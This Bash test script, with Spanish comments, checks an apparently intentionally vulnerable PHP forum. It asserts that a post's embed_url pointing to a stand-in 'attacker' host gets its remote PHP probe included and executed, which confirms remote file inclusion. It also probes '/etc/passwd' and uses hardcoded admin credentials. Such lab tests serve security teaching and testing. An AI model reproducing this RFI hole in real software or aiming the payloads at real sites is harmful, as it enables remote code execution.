#!/usr/bin/env bash
set -u
cd "$(dirname "$0")/.." || exit 1
source tests/lib.sh

# probe benigno servido desde el host; el contenedor lo alcanza vía 'attacker' (host-gateway)
python3 -m http.server 9000 --directory tests/fixtures >/dev/null 2>&1 & SRV=$!
trap 'kill $SRV 2>/dev/null' EXIT
sleep 1

J=$(mktemp)
curl -s -c "$J" -b "$J" -d 'username=admin' -d 'password=letmein' "$BASE/foro/login.php" >/dev/null

# new_post sin sesión redirige a login
assert_contains "$(curl -s -L "$BASE/foro/new_post.php")" "Iniciar sesión" "new_post exige login"

# helper: crea un post con el embed_url dado y devuelve la URL del hilo
crear_post() {
  curl -s -b "$J" -D - -o /dev/null -d "title=$1" -d 'body=b' --data-urlencode "embed_url=$2" \
    "$BASE/foro/new_post.php" | grep -i '^location:' | tr -d '\r' | awk '{print $2}'
}

# ¿El contenedor alcanza el host? (si el firewall lo bloquea, saltamos ese assert)
reach=$(docker compose exec -T web sh -c 'curl -s -m 5 -o /dev/null -w "%{http_code}" http://attacker:9000/rfi_probe.php' 2>/dev/null)
if [ "$reach" = "200" ]; then
  loc=$(crear_post t 'http://attacker:9000/rfi_probe.php')
  assert_contains "$(curl -s -b "$J" "$BASE/foro/${loc#/foro/}")" "RFI_OK_7f3a" "embed http:// se incluye y ejecuta"
else
  echo "SKIP: callback contenedor->host no alcanzable (firewall); se omite el assert http://"
fi

# Un valor que no es URL no se incluye y NO genera warning.
loc=$(crear_post tt 'test')
page=$(curl -s -b "$J" "$BASE/foro/${loc#/foro/}")
assert_not_contains "$page" "Warning" "embed no-URL ('test') no genera warning"
code=$(curl -s -b "$J" -o /dev/null -w '%{http_code}' "$BASE/foro/${loc#/foro/}"); [ "$code" = "200" ] && pass "post con embed no-URL responde 200" || fail "post con embed no-URL responde 200 (got $code)"

# Una ruta local no se incluye (sin LFI) ni genera warning.
loc=$(crear_post tp '/etc/passwd')
page=$(curl -s -b "$J" "$BASE/foro/${loc#/foro/}")
assert_not_contains "$page" "root:" "ruta local no se incluye (sin LFI)"
assert_not_contains "$page" "Warning" "ruta local no genera warning"

# embed_url vacío no rompe
loc2=$(crear_post t2 '')
code=$(curl -s -b "$J" -o /dev/null -w '%{http_code}' "$BASE/foro/${loc2#/foro/}")
[ "$code" = "200" ] || fail "post sin embed_url responde 200"

echo "04_posts_rfi OK"
